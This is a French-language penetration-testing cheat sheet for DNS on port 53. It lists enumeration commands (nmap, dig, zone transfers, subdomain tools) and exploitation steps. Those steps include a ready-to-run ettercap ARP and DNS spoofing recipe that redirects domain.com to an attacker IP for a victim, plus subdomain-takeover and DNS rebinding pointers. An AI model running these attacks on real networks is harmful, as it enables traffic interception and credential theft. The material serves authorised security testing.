# DNS (53/TCP/UDP)

Le Domain Name System (DNS) traduit les noms de domaine en adresses IP.

## 🔍 Énumération

### Scan de base
```bash
# Scan DNS avec Nmap
sudo nmap -sU -p 53 $IP
sudo nmap -sT -p 53 $IP

# Vérification des scripts de vulnérabilité
nmap --script=dns-* -p 53 $IP
```

### Requêtes DNS basiques
```bash
# Requête pour enregistrements A
dig @$IP domain.com A

# Requête pour enregistrements MX
dig @$IP domain.com MX

# Requête pour tous les enregistrements
dig @$IP domain.com ANY

# Requête inverse
dig @$IP -x [TARGET_IP]
```

### Transfert de zone
```bash
# Tentative de transfert de zone
dig axfr @$IP domain.com

# Avec host
host -t axfr domain.com $IP

# Transfert de zones pour tous les domaines trouvés
for domain in $(cat subdomains.txt); do dig axfr @$IP $domain; done
```

### Énumération de sous-domaines
```bash
# Avec Fierce
fierce --domain domain.com --dns-servers $IP

# Avec Subbrute
./subbrute.py domain.com -s wordlist.txt -r $IP

# Avec subfinder
subfinder -d domain.com -v
```

## 🔨 Exploitation

### DNS Zone Transfer
```bash
# Automatisation avec dnsrecon
dnsrecon -d domain.com -t axfr -n $IP

# DNSEnum
dnsenum --dnsserver $IP --enum domain.com
```

### Empoisonnement de cache DNS
```bash
# Configuration d'Ettercap pour DNS spoofing
echo "domain.com A [ATTACKER_IP]" >> /etc/ettercap/etter.dns
echo "*.domain.com A [ATTACKER_IP]" >> /etc/ettercap/etter.dns

# Lancement de l'attaque
sudo ettercap -T -q -P dns_spoof -M arp:remote /[VICTIM_IP]/ /[GATEWAY_IP]/
```

### Test de takeover de sous-domaine
```bash
# Vérifier les CNAME qui pointent vers des services inactifs
for subdomain in $(cat subdomains.txt); do
  host $subdomain | grep CNAME
done

# Vérifier avec can-i-take-over-xyz
# https://github.com/EdOverflow/can-i-take-over-xyz
```

### Exploitation DNS rebinding
```bash
# Utilisation de Singularity
git clone https://github.com/nccgroup/singularity
cd singularity
# Suivre les instructions d'installation
```

## 🔐 Post-exploitation

### Collecte d'informations supplémentaires
```bash
# Récupération des enregistrements TXT (peuvent contenir des infos sensibles)
dig @$IP domain.com TXT

# Recherche de certificats SSL associés
curl -s "https://crt.sh/?q=%.domain.com&output=json" | jq -r '.[] | .name_value' | sort -u
```

### Analyse de configuration DNS
```bash
# Vérification des vulnérabilités DNSSEC
dig @$IP domain.com DNSKEY
dig @$IP domain.com DS

# Test de requêtes récursives non autorisées
dig @$IP www.google.com
```

## ⚠️ Erreurs courantes & astuces
- Le transfert de zone est souvent restreint aux serveurs DNS secondaires
- Utiliser UDP pour les requêtes standards et TCP pour les transferts de zone
- Les serveurs DNS peuvent limiter le nombre de requêtes par IP
- Pensez à vérifier les noms de serveurs (NS) avant d'attaquer